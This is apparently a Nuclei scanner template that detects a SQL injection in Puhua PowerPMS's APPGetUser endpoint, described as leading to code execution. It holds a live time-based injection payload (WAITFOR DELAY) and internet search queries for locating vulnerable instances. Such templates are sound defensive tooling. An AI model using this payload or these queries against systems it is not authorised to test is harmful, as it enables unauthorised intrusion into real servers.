id: PowerPMS_APPGetUser_SQLi

info:
  name: PowerPMS_APPGetUser_SQLi
  author: HK
  severity: high
  description: 普华-PowerPMS APPGetUser SQL注入致RCE漏洞复现
  metadata:
    max-request: 1
    Fofa-query: body="/APPAccount/QrCodeLoginPC"
    Quake-query: body="/APPAccount/QrCodeLoginPC"
    Hunter-query: body="/APPAccount/QrCodeLoginPC"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /APPAccount/APPGetUser?name=1%27%29%3BWAITFOR+DELAY+%270%3A0%3A4%27-- HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

  redirects: true
  matchers-condition: and
  matchers:
    - type: dsl
      dsl:
        - 'duration >= 4'